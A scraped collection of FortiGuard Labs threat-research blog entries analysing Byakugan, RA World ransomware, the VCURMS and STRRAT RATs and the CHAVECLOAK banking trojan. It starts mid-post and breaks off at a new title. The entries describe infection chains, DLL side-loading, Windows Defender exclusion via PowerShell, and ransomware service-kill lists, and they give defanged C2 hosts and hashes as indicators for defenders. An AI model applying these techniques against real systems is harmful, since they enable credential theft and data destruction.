AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident ResponseTeam. hjkdnd[.]duckdns[.]orgmup830634[.]duckdns[.]orgmarkjohnhvncpure[.]duckdns[.]orghomoney177[.]duckdns[.]orgfebvenom8[.]duckdns[.]orgrachesxwdavid[.]duckdns[.]org hxxps://nanoshd[.]pro/files/new_image.jpg?14441723hxxps://nanoshield[.]pro/new_image2.jpg?166154725hxxps://kisanbethak[.]com/P/hxxps://kisanbethak[.]com/K/ 06779e1015bd7dd2012ad03f7bb3f34e8d99d6ca41106f89cb9fb1ec46fe034e0b5631041336a58ab859d273d76c571dd372220dfa1583b597a2fe5339ad4bf70f1d6aab547ceca6e71ac2e5a54afdaea597318fe7b6ca337f5b92fdff5961682373840bc455d601551304ec46c281b218e90a91dce3823709c213814636e899258578c03ca314ac3a636a91e8b3245230eae974cf50799d89b3f931e637014c411ad772af94a042413af482a2ef356d3217bcc5123353e3c574347cb93e3d5a4a4b5c22c877437c359ef2acaeeb059881da43b11798581cf2f31c2c83fc34184cda23993d793ef070be7b9066f31a45b10c1e72d809f4a43726da977a0069d851ecf11a64e934409bfada2b6f0c4d89c3420ca95640bc88f928906e6f0b483253a522051e0319176dece493b7e2543135ed41c402adbfeda32a5f6be7d68175546a85e384ced3d4535bad16a877ecd36a79849c379c5daa357689116f042c1b5c5caa3182d6b121c1445d6ca81134ec262cd5ea4f9ef1944f993b63d19876475f1746b4bd8d94d4d3feb1e2d4a829b6c3bab9341e272341f4b3a1da01d207456aaff578555cb82159a9c16a159f0437c39b673744e0c537c4b7f0f67f56c5d96ac5c7284aaa0c195723df7a78ae610a7ee096b3b5bc19f6838451acd438116e71a22bed7ab5a26158fc1cf1b7bb87146254672483aad72736817ff16e656c7b7d7a710e3c0e5da830213f9b72f44a72d721adcf17abc838f28286dde8a1e8d97d9c8d44554ee10310805920afb51249a1e8cd3e32b430e8c9638fec316913d385790dad1a0af5febd7d90e0ec9ce680ec87dcc31a94a25bfb454bb121164bfd8e97019f8c4712f1fc9728c4706112a5ef85a05aa809985709faef951925e09494b2e06e45407f193cfe58e18f5c250bbd1b8e857a754f1c366913129b9dada7bee35a9d30d6f69cd6d173c6a6a93110cac59ab3710e32eced6f266581e88b87cd1364d8c7f6f0246ed91cd294e2e506e7c94ba2f9a33c373c6fcfe04bbe17e7d04bf1a9f6014bf4bcdb3ac4eb6d85bcc4159ae25a7f00c4493cbcb8e892e159d05ad3dc62e1dc45fd31dc2382c1ea5e5f26f4f7692cb2ef8fd1c6e74b69fa16dc2c1694d363d78cdfed0574cf51413b9b48d932e076033bb76cf69a4470b7e9dceea68a037376b323d2a934f9fdc59bfbd2c2c0ed66014bdf059f403f4dc6f2e190d172b7d3c7f1055052f0ed3da5d5979a8a2b622ca2fbcea90774a5bf6008f02c04bc428694a11917375f41ecb7c7aa326cf242b4c56ed1e7b3ae14d5dd68f4164be3d357682754559aa32ea74c284eee64140d3f56a63a225d5de10d051c Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/scrubcrypt-deploys-venomrat-with-arsenal-of-plugins"
  },
  {
    "title": "Byakugan – The Malware Behind a Phishing Attack",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2024, FortiGuard Labs collected a PDF file written in Portuguese that distributes a multi-functional malware known as Byakugan. While investigating this campaign,a reportabout it was published. Therefore, this report will only provide a brief analysis of the overlap between that attack and this and focus primarily on the details of the infostealer. The PDF image shows a blurred table and asks the victim to click the malicious link on the PDF file to see the content. Once the link is clicked, a downloader is downloaded. The downloader drops a copy of itself (require.exe) along with a clean installer to the temp folder. It then downloads a DLL (dynamic link library), which is executed via DLL-hijacking to run require.exe to download the main module (chrome.exe). It executes the downloader's copy (require.exe), not the downloader (Reader_Install_Setup.exe), because when the downloader is named \"require.exe\" and located in the temp folder, its behavior is different from when it is Reader_Install_Setup.exe. The downloader downloads Byakugan’s main module from thinkforce[.]com[.]br. This is the C2 server from which Byakugan receives files and commands. However, it may also work as the attacker's control panel. There is a login page on port 8080. We found descriptions of its features from the page's source code. Byakugan is a node.js-based malware packed into its executable by pkg. In addition to the main script, there are several libraries corresponding to features. Additionally, Byakugan can download extra files to perform its functions. These are stored in the default base path, % APPDATA%ChromeApplication, which is also used to store data created by Byakugan. Byakugan has the following features: In a previous variant (7435f11e41735736ea95e0c8a66e15014ee238c3a746c0f5b3d4faf4d05215af), Byakugan downloaded the software from its domain. But this is not seen in this newer variant. In addition, there are some features that help Byakugan live as long as possible: In addition, it sets the path it uses to the Windows Defender’s exclusion path and allows files in the Windows firewall. There is a growing trend to use both clean and malicious components in malware, and Byakugan is no exception. This approach increases the amount of noise generated during analysis, making accurate detections more difficult. However, the downloaded files provided critical details about how Byakugan works, which helped us analyze the malicious modules. FortiGuard Labs will continue to monitor this malware and provide updates on this variant as they become available. The malware described in this report is detected and blocked by FortiGuard Antivirus as: W64/BKGStealer.854C!trW64/BKGStealer.4C6A!trW64/BKGStealer.47AF!trPDF/TrojanDownloader.Agent.BKN!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. github[.]com/thomasdev33kgithub[.]com/fefifojsgithub[.]com/wonderreader blamefade.com[.]brthinkforce.com[.]br c7dbb5e9e65a221a5f78328b5a6141dd46a0459b88248e84de345b2a6e52b1d9c6fe9169764301cadccb252fbed218a1a997922f0df31d3e813b4fe2a3e6326dc9a27dbae96afb7d083577d30b2947c8ba9d1a6cb7e10e5f259f0929ef107882 9ef9bbfce214ee10a2e563e56fb6486161c2a623cd91bb5be055f5745edd64794d8eac070b6b95f61055b96fb6567a477dbc335ef163c10514c864d9913d23cb30991c9cac5f4c5c4f382f89055c3b5e9bb373c98ce6a5516d06db3f8a478554 malware analysis,phishing FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/byakugan-malware-behind-a-phishing-attack"
  },
  {
    "title": "Ransomware Roundup – RA World",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the RA World ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data.Severity level:High The RA World ransomware was first submitted to a publicly available file scanning service in early December 2023. The threat actor steals victims' data before deploying and running its ransomware malware for file encryption. The group operates both TOR and non-TOR sites where victims' stolen data has been leaked. The ransomware is also designed to delete Volume Shadow Copies and system backups to inhibit system recovery. Information on the infection vector used by the RA World ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The RA World ransomware samples were submitted to a publicly available file scanning service from the Netherlands, France, the United Kingdom, the Czech Republic, Poland, Colombia, and Japan. The ransomware's data leak sites list 23 victims at the time of this writing. The listed victims are located in Germany, the UK, the US, Italy, Poland, India, Taiwan, Mexico, France, Thailand, and Korea. The first available RA World sample (SHA2: 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801) performs the following actions: It stops the following services: vss svc$ memtas sophos veeam backup mepocs GxVss GxBlr GxFWD GxCVD GxCIMgr DefWatch ccEvtMgr ccSetMgr SavRoam RTVscan QBFCService QBIDPService Intuit.QuickBooks.FCS QBCFMonitorService YooBackup YooIT zhudongfangyu stc_raw_agent VSNAPVSS VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService AcrSch2Svc AcronisAgent CASAD2DWebSvc CAARCUpdateSvc It terminates the following processes: sql.exe oracle.exe ocssd.exe dbsnmp.exe synctime.exe agntsvc.exe isqlplussvc.exe xfssvccon.exe mydesktopservice.exe ocautoupds.exe encsvc.exe firefox.exe tbirdconfig.exe mydesktopqos.exe ocomm.exe dbeng50.exe sqbcoreservice.exe excel.exe infopath.exe msaccess.exe mspub.exe onenote.exe outlook.exe powerpnt.exe steam.exe thebat.exe thunderbird.exe visio.exe winword.exe wordpad.exe notepad.exe The ransomware uses the following commands to delete Volume Shadow Copies: The malware encrypts files on the victims’ machines and adds the following extension to the encrypted files: It then drops the ransom note “Data breach warning.txt,“ which includes the following information: The ransomware excludes the following filetypes from file encryption: .exe .dll .RAWLD .iso .msi .bin It excludes the following files and folders from file encryption: AppData Boot Windows SYSVOL Tor Browser Internet Explorer Google Opera Opera Software Mozilla Mozilla Firefox $Recycle.Bin ProgramData All Users autorun.inf boot.ini bootfont.bin bootsect.bak bootmgr bootmgr.efi bootmgfw.efi desktop.ini $windows.~ws system volume information intel msocache perflogs iconcache.db ntldr ntuser.dat ntuser.dat.log ntuser.ini thumbs.db Program Files Program Files (x86) #recycle config.msi $windows.~bt The ransomware uses the following specific mutex: Based on this RA World ransomware sample, the following assumption can be made: For example, another RA World ransomware sample (SHA2: 51da3acc6c7089bd0f1df9d9902e183db0d1342552404c3c1b898b168399b0bc) claims to have been compiled on Aug 24 17:56:57 2022 GMT, however this sample did not appear on the file scanning site until February 2, 2024. Its ransom note lists fewer unpaid victims, indicating that the sample was created after 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801. A minor variant of the RA World ransomware (SHA2: 9479a5dc61284ccc3f063ebb38da9f63400d8b25d8bca8d04b1832f02fac24de) became available at the end of January 2024. This variant performs the identical actions as 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801 except for the following: A few days later, yet another minor RA World ransomware variant (SHA2: 31ac190b45cc32c04c2415761c7f152153e16750516df0ce0761ca28300dd6a4) became available. This variant also performs the identical actions as the previously mentioned RA World ransomware samples except for the following: As mentioned above, the RA World ransomware group operates both TOR and non-TOR sites to publish stolen data. The site includes the following statement, which provides a clue to the group's location: War is death’s feast. I survived, but my friend didn’t. Below is an example of a page created for one of the victims: The RA World ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. RA World Ransomware File IOCs SHA2 Note 4866d6994c2f8b4dadfaabc2e2b81bd86c12f68fdf0da13d41d7b0e30bea0801 RA World ransomware 51da3acc6c7089bd0f1df9d9902e183db0d1342552404c3c1b898b168399b0bc 31ac190b45cc32c04c2415761c7f152153e16750516df0ce0761ca28300dd6a4 9479a5dc61284ccc3f063ebb38da9f63400d8b25d8bca8d04b1832f02fac24de Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-ra-world"
  },
  {
    "title": "VCURMS: A Simple and Functional Weapon",
    "content": "FortiGuard Labs Threat Research Affected platforms:All platforms with Java installedImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High Recently, FortiGuard Labs uncovered a phishing campaign that entices users to download a malicious Java downloader with the intention of spreading new VCURMS and STRRAT remote access trojans (RAT). The attackers stored malware on public services like Amazon Web Services (AWS) and GitHub, employing a commercial protector to avoid detection of the malware. The attacker attempts to use email as its command and control throughout the attack campaign. The receiving endpoint utilizes Proton Mail, which offers email services that include privacy protection. Figure 1 shows the attack chain. This blog describes how the malware is delivered and specifically examines the unusual VCURMS RAT that is involved in this campaign. The phishing email shown in Figure 2 is part of this attack campaign. It targets staff members, implying that a payment is underway and encourages them to click a button to verify payment information. Upon clicking the button, a harmful JAR file hosted on AWS is downloaded to the victim's computer. The downloaded files resemble typical phishing attachments with spoofed names intended to lure people into opening them. When you look at the file with a JAR decompiler, many strings are obfuscated and one of the class names “DownloadAndExecuteJarFiles.class” clearly indicates the intention of this program, as shown in Figure 3. The program aims to download two JAR files to the attacker-provided path and executes them. As shown in Figure 4, a class employed by the obfuscator is labeled \"sense loader\" in the debug data. The obfuscator selects the appropriate native loader module from the resources based on the current operating system during the execution process. After a specific date, running the malware causes a notification to appear regarding the expiration of the trial for protected tools as shown in Figure 5. Additionally, the code generated by the obfuscator closely resembles the code produced by a legitimate obfuscation tool known as \"Sense Shield Virbox Protector\" as shown in Figure 6. The rest of the execution flow of the JAR file downloads two additional JAR files and runs them separately. We observed an unusual RAT that communicates with its command and control through email. During the initialization step, the program replicates itself into the Startup folder to ensure that it runs automatically when Windows starts. It then alerts the attacker that the victim is online and establishes a schedule to periodically check the mailbox as shown in Figure 7. The attacker identifies the victim using the computer name and Volume ID. When the malware needs to verify the command provided by the attacker, it first examines whether the subject of the email contains identifying information and then proceeds to check the command within the body of the email. The keylogger and password recovery malware are also hosted on AWS and disguised with a .jpg extension. They are downloaded using a PowerShell command. In addition to installing keyloggers and password recovery malware, the command provides various customizable features such as the ability to execute shell commands and upload and download files as shown in Table 1. Command Details get information Retrieve system details such as the operating system version, memory capacity, computer name, volume ID, username, country, and the files in the Desktop and Documents folders. shell Obtain the command and execute it throughcmd.exe /c;the result is sent back to the attacker via email. recovery Download arecoveryJAR file with a .jpg extension and execute it. start keylogger Download akeyloggerJAR file with a .jpg extension and execute it. get keylogger Attach the keylogger data and send it as an attachment. upload Compress the file at the specified location and then send it as an attachment. download Retrieve the attachment and only allow file extensions that are in .jpg format to be accepted. search Look for file names containing keywords specified by the attacker. Table 1: Commands The most downloaded malware in this campaign are obfuscated using the Branchlock obfuscator. Information about this obfuscator is located at the end of the JAR file as shown in Figure 10. TheNarumii/Deobfuscatorplays a crucial role in partially supporting the deobfuscation of a program obfuscated with Branchlock. When the command \"recovery\" is received, the program is downloaded and deployed into the %USERPROFILE%\\AppData\\cookie directory with the name st.jar. The primary purpose of the program is to steal information, particularly system information, popular browsers, and apps. The program gathers account information from apps and collects cookies, autofill data, browsing history, and passwords from browsers. The data collected is stored in the directory located at %USERPROFILE%/<username>. Despite the component similarities to Rude Stealer, a Java-based infostealer, this program adopts the name VCURMS. We also have observed a distinction in the method of transmitting the pilfered data. The attacker follows the same path as the main program and sends the stolen information through the same email address. The downloaded keylogger will ultimately be stored in %USERPROFILE%\\AppData\\cookie\\klog.jar. This file is responsible for recording keystrokes. Additional actions such as sending logs back to the attacker requires the main JAR file \"windows.jar\" to execute the functions. STRRAT is a RAT built using Java, which has a wide range of capabilities, such as serving as a keylogger and extracting credentials from browsers and applications. By the end of 2023, it was discovered that STRRAT utilizes two string obfuscation techniques, namely \"Zelix KlassMaster (ZKM)\" and \"Allatori\" to avoid detection. However, the STRRAT observed in this attack campaign follows the same convoluted process. It uses the Allatori Java obfuscator and includes the Branchlock obfuscator, which makes analysis more difficult. The configuration file still remains in the resource. By decoding it using Base64 and decrypting it with the AES Algorithm using the passphrase \"strigoi,\" we can obtain information about the command and control server and ID “Khonsari.” This comprehensive attack operation deploys several malicious programs simultaneously on a victim’s system. It deploys a well-known STRRAT and a new VCURMS based on Java. Even though the VCURMS RAT primarily handles command and control communication, it also includes a modified version of a Rude Stealer and a keylogger in its second phase to gather sensitive data from the victim's system. We discovered that the threat actor was using multiple obfuscation techniques to avoid detection and attempting to use email for communicating with the command and control server. The malware described in this report are detected and blocked byFortiGuard Antivirusas: Java/Agent.A881!trJava/Agent.X!tr.spyJava/Agent.A249!trJava/Agent.6057!trJava/Agent.E730!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. copier@ferrellengineering[.]comsacriliage@proton[.]me bankofindustry[.]s3[.]us-east-2[.]amazonaws[.]comriseappbucket[.]s3[.]ap-southeast-1[.]amazonaws[.]comofornta[.]ddns[.]netjbfrost[.]livebackinghof[.]ddns[.]net 97e67ac77d80d26af4897acff2a3f6075e0efe7997a67d8194e799006ed5efc98d72ca85103f44742d04ebca02bff65788fe6b9fc6f5a411c707580d42bbd249588d6f6feefa6273c87a3f8a15e2089ee3a063d19e6a472ffc0249298a72392d8aa99504d78e88a40d33a5f923caf7f2ca9578031d004b83688aafdf13b3b59fc0d0dee9b8345da3c6cf3e1c3ce5b5b6e8c9e4002358517df1e3cd04c0f0b3d1 rat,trojan FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/vcurms-a-simple-and-functional-weapon"
  },
  {
    "title": "New Banking Trojan “CHAVECLOAK” Targets Brazil",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim’s device and collects sensitive informationSeverity Level:High FortiGuard Labs recently uncovered a threat actor employing a malicious PDF file to propagate the banking Trojan CHAVECLOAK. This intricate attack involves the PDF downloading a ZIP file and subsequently utilizing DLL side-loading techniques to execute the final malware. Notably, CHAVECLOAK is specifically designed to target users in Brazil, aiming to steal sensitive information linked to financial activities. Figure 1 shows the detailed flow of this cyber threat. In the South American cyberthreat landscape, banking trojans employ a range of tactics, such as phishing emails, malicious attachments, and browser manipulation. Notable examples include Casbaneiro (Metamorfo/Ponteiro), Guildma, Mekotio, and Grandoreiro. These trojans specialize in illicitly obtaining online banking credentials and personal data, posing a significant threat to users in countries like Brazil and Mexico. The CHAVECLOAK's Command and Control (C2) server telemetry is shown in Figure 2. In this blog, we will elaborate on the details of the malware. The PDF, shown in Figure 3, claims contain documents related to a contract, with instructions written in Portuguese. It lures its victims to click a button so they can read and sign the attached documents. However, a malicious downloader link is discreetly embedded within the stream object, as shown in Figure 4, which reveals the decoded URL. This URL undergoes processing via the free link shortening service “Goo.su,” ultimately leading to a redirect at hxxps://webattach.mail.yandex.net/message_part_real/NotaFiscalEsdeletronicasufactrub66667kujhdfdjrWEWGFG09t5H6854JHGJUUR[.]zip for downloading the ZIP file. Upon decompression, the file yields the MSI file “NotafiscalGFGJKHKHGUURTURTF345.msi.” Following the decompression of the MSI installer, we uncovered multiple TXT files related to settings for different languages, a legitimate execution file, and a malicious DLL named “Lightshot.dll.” Notably, the modified date for this DLL file is more recent than that of all the other files in the installer, further emphasizing its unusual nature. Examining the MSI installer reveals its entire configuration, which is written in Portuguese. It executes the file “Lightshot.exe,” extracting and depositing files at “%AppData%\\Skillbrains\\lightshot\\5.5.0.7,” as shown in Figure 6. The file “Lightshot.exe” then deploys DLL sideloading techniques to activate the execution of the malicious DLL, \"Lightshot.dll.\" This technique lets the legitimate executable load and run the malicious code discreetly, facilitating unauthorized activities like data theft. The actions conducted by “Lightshot.dll” involve covert and harmful operations, including the unauthorized acquisition of sensitive information. DLL sideloading poses a significant security threat by allowing the malware to exploit legitimate processes for nefarious purposes without detection. Initially, the process invokes “GetVolumeInformationW” to gather details about the file system and the associated volume related to the specified root directory. It utilizes the HEX value obtained to generate a log file in “%AppData%[HEX ID]lIG.log.” Following this, it adds a registry value named “Lightshot” to “HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,” ensuring automatic execution of the “Lightshot.exe” program upon user login. Once logging and persistence are completed, it sends an HTTP request to hxxp://64[.]225[.]32[.]24/shn/inspecionando.php. If geo-checking confirms that the victim is in Brazil, it logs data on the server, accessible through the path “clients.php,” as shown in Figure 8. It then periodically monitors the foreground window using the APIs “GetForegroundWindow” and “GetWindowTextW.” Upon identifying a window and confirming its name against a predefined list of bank-related strings, the malware establishes communication with its Command and Control (C&C) server. The malware facilitates various actions to steal a victim's credentials, such as allowing the operator to block the victim's screen, log keystrokes, and display deceptive pop-up windows, as shown in Figure 10. The malware actively monitors the victim's access to specific financial portals, including several banks and Mercado Bitcoin, which encompasses both traditional banking and cryptocurrency platforms. After obtaining the user's entered login data, the malware initiates communication with its Command and Control (C2) server at hxxp://comunidadebet20102[.]hopto[.]org. Depending on the bank associated with the stolen data, it uploads the information to distinct paths: “04/M/” for Mercado Bitcoin. It then transmits a POST request containing essential system details and configures the account information within the “InfoDados” parameter, as seen in Figure 12. Additionally, we acquired an older variant of CHAVECLOAK from the check-in site. Its process differs from the previous one, as the ZIP file contains a Delphi executable file embedding the final payload in the RCData section. It begins by retrieving system information to establish a new folder and stores the payload at “C:\\Program Files (x86)\\Editor-GH-[HEX ID]\\Editor-[HEX ID].exe.” Simultaneously, it creates a log file, establishes persistence, and utilizes the PowerShell command “Add-MpPreference –ExclusionPath” to exclude the path “Editor-GH-[HEX ID]” from Windows Defender scans. Subsequently, it sends a check-in request to hxxp://64[.]225[.]32[.]24/desktop/inspecionando.php. Notably, this variant appears to be an earlier version, indicated by the victims' check-in date starting in 2023. It also actively observes user behavior, captures front window text, and harvests personally identifiable information from specified banking and Bitcoin login pages, including names, passwords, and keystrokes. It then transmits the stolen data to the Command and Control (C2) server at hxxp://mariashow[.]ddns[.]net/dtp/cnx.php. The emergence of the CHAVECLOAK banking Trojan underscores the evolving landscape of cyberthreats targeting the financial sector, specifically focusing on users in Brazil. Utilizing sophisticated techniques, including malicious PDFs, ZIP file downloads, DLL sideloading, and deceptive pop-ups, it joins a cohort of prominent banking trojans that primarily target South America. CHAVECLOAK employs Portuguese language settings, indicating a strategic approach to the region, and actively monitors victims' interactions with financial portals. CHAVECLOAK exemplifies the sophistication of contemporary banking trojans, necessitating continual vigilance and proactive cybersecurity measures to safeguard against evolving threats within the financial landscape of South America. The malware described in this report are detected and blocked byFortiGuard Antivirusas: PDF/Agent.72C4!trW32/Banker.CNX!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeFortinet Certified Fundamentals (FCF)in cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. 64[.]225[.]32[.]24 hxxps://webattach.mail.yandex.net/message_part_real/NotaFiscalEsdeletronicasufactrub66667kujhdfdjrWEWGFG09t5H6854JHGJUUR[.]ziphxxps://goo[.]su/FTD9owO mariashow[.]ddns[.]netcomunidadebet20102[.]hopto[.]org 51512659f639e2b6e492bba8f956689ac08f792057753705bf4b9273472c72c448c9423591ec345fc70f31ba46755b5d225d78049cfb6433a3cb86b4ebb5a0284ab3024e7660892ce6e8ba2c6366193752f9c0b26beedca05c57dcb684703006131d2aa44782c8100c563cd5febf49fcb4d26952d7e6e2ef22f805664686ffff8b39baec4b955e8dfa585d54263fd84fea41a46554621ee46b769a706f6f965c634542fdd6581dd68b88b994bc2291bf41c60375b21620225a927de35b5620f92ca1b23be99b6d46ce1bbd7ed16ea62c900802d8efff1d206bac691342678e55 Cara Lin,trojan FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/banking-trojan-chavecloak-targets-brazil"
  },
  {
    "title": "FortiGuard Labs Outbreak Alerts Annual Report 2023: A Glimpse into the Evolving Threat Landscape",
    "content": "FortiGuard Labs Threat Research In today’s dynamic threat environment, staying informed and proactive is crucial for any organization seeking to protect its networks. The FortiGuard Labs Outbreak Alerts Annual Report 2023 is a comprehensive resource that delves into real-world examples of attacks across diverse verticals, offering valuable insights into the most significant cyberattacks of 2023 and critical information that organizations can use to evaluate their cybersecurity posture. The report also goes beyond mere numbers. It offers: The FortiGuard Labs Outbreak Alerts Annual Report 2023 empowers organizations with the knowledge they need to proactively defend themselves. Organizations can subscribe tooutbreak alertsto: The FortiGuard Labs Outbreak Alerts Annual Report 2023 is a vital resource for anyone wanting to gain a holistic view of cyberthreats. By understanding the various significant threats and translating that information into proactive measures, organizations can better protect themselves from cyberattacks. Downloadthe FortiGuard Labs Outbreak Alerts Annual Report 2023. Stay ahead of the latest threats bysubscribing to outbreak alertsfrom FortiGuard Labs. Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-labs-outbreak-alerts-report-2023"
  },
  {
    "title": "Ransomware Roundup – Abyss Locker",
